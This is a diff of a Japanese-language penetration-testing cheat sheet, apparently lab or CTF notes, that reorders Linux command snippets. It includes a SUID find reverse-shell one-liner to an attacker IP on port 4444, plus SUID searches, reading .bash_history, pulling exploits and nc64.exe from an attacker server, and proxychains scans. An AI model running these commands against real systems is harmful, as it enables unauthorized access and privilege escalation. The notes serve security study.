@@ -2,48 +2,45 @@
 
 * ファイル指定
 
-``` shell
-  # 便利
-  # $(which XXX)
-  cp $(which find) /tmp/find
-```
-
-* パスワード変更
-
-    ```shell
-      passwd [USER_NAME]
-    ```
-
-* ユーザ情報
-
   ``` shell
-    id
+      # 便利
+      # $(which XXX)
+      cp $(which find) /tmp/find
   ```
-
-* sudo
-  
-    ``` shell
-      #sudoの情報表示
-      sudo -l
-    ```
-
-* find
-
-``` shell
-  #sudo設定のファイルを検索
-  find / -perm -4000
-  #または
-  find / -type f -perm -4000 -ls 2>/dev/null
-  #コマンド実行
-  find ~/.profile -exec /bin/bash -p -i >& /dev/tcp/<kali ip address>/4444 0>&1 \; -quit
-```
 
 * cat
 
-``` shell
-  #過去の入力情報の表示
-  cat /home/XXX/.bash_history
-```
+  ``` shell
+      #過去の入力情報の表示
+      cat /home/XXX/.bash_history
+  ```
+
+* cron
+
+  ``` shell
+      # 設定確認
+      cat /etc/crontab
+      #　登録
+      crontab -u <ユーザ名> -e    
+  ```
+
+* curl
+
+  ``` shell
+      #curlでファイル転送
+      curl http://<Remote KaliのIP>:8000/nc64.exe -o nc64.exe
+  ```
+
+* find
+
+  ``` shell
+      #sudo設定のファイルを検索
+      find / -perm -4000
+      #または
+      find / -type f -perm -4000 -ls 2>/dev/null
+      #コマンド実行
+      find ~/.profile -exec /bin/bash -p -i >& /dev/tcp/<kali ip address>/4444 0>&1 \; -quit
+  ```
 
 * grep
   
@@ -65,29 +62,37 @@
       ls /etc | egrep -e "fedore*|debian*|gentoo*|mandriva*|mandrake*|meego*|redhat*|lsb-*|sun-*|SUSE*|release"
     ```
 
-* wget
-  * ダウンロード
+* ユーザ情報
 
   ``` shell
-    # ダウンロード
-    wget https://www.exploit-db.com/download/XXXXXX -O filename
+      id
   ```
+
+* マウントされているボリュームの取得
   
-  * 自前のwebサーバーからファイルをダウンロードさせる。
-
   ``` shell
-      # Web server
-      python -m http.server 8000
-      # 転送
-      # wget -O [転送先] [転送するファイル]
-      wget -O /tmp/XXX http://XXX.XXX.XXX.XXX:8000/filename
+      mount
   ```
 
-* curl
+* netstat
 
   ``` shell
-      #curlでファイル転送
-      curl http://<Remote KaliのIP>:8000/nc64.exe -o nc64.exe
+      # ネットワーク状態確認
+      netstat -pantu
+  ```
+
+* パスワード変更
+
+  ```shell
+      passwd [USER_NAME]
+  ```
+
+* ProxyChains
+  
+  ``` shell
+      #dynamic port forward　 
+      #proxy経由でターゲットへのnmapスキャン
+      proxychains nmap -top-ports=20 -sT -Pn XXX.XX.XXX.XXX
   ```
 
 * pythonの仮想環境
@@ -103,41 +108,6 @@
       deactivate
   ```
 
-* マウントされているボリュームの取得
-  
-  ``` shell
-    mount
-  ```
-
-* xfreerdp
-
-  ``` shell
-      xfreerdp /u:win /p:password /v:127.0.0.1
-  ```
-
-* ssh
-
-  ``` shell
-    ssh -i /home/XXX/.ssh/id_rsa <user_name>@XXX.XXX.XXX.XXX -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
-
-    # port forwarding
-    ssh -N -L <localport>:<remoteXXX.XXX.XXX.XXX>:<remote_port> <踏み台user>@<踏み台XXX.XXX.XXX.XXX.>
-    
-    # dynamic port forwarding
-    ssh -fND 127.0.0.1:8080
-    #proxy経由でターゲットへのnmapスキャン
-    proxychains nmap -top-ports=20 -sT -Pn XXX.XX.XXX.XXX
-  ```
-
-* cron
-
-  ``` shell
-      # 設定確認
-      cat /etc/crontab
-      #　登録
-      crontab -u <ユーザ名> -e    
-  ```
-
 * sftp
   
   ``` shell
@@ -145,4 +115,48 @@
       sftp -i /home/kali/id_rsa -P 8080 testuser@localhost
       #接続後 ファイルを自分の端末に転送
       get /C:/Users/testuser/Desktop/Pentest/flag.txt
+  ```
+
+* ss
+  
+  ``` shell
+      # portの開通確認
+      ss -pantu
+  ```
+
+* ssh
+
+  ``` shell
+      ssh -i /home/XXX/.ssh/id_rsa <user_name>@XXX.XXX.XXX.XXX -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+  ```
+
+* sudo
+  
+    ``` shell
+        #sudoの情報表示
+        sudo -l
+    ```
+
+* wget
+  * ダウンロード
+
+  ``` shell
+      # ダウンロード
+      wget https://www.exploit-db.com/download/XXXXXX -O filename
+  ```
+  
+  * 自前のwebサーバーからファイルをダウンロードさせる。
+
+  ``` shell
+      # Web server
+      python -m http.server 8000
+      # 転送
+      # wget -O [転送先] [転送するファイル]
+      wget -O /tmp/XXX http://XXX.XXX.XXX.XXX:8000/filename
+  ```
+
+* xfreerdp
+
+  ``` shell
+      xfreerdp /u:win /p:password /v:127.0.0.1
   ```
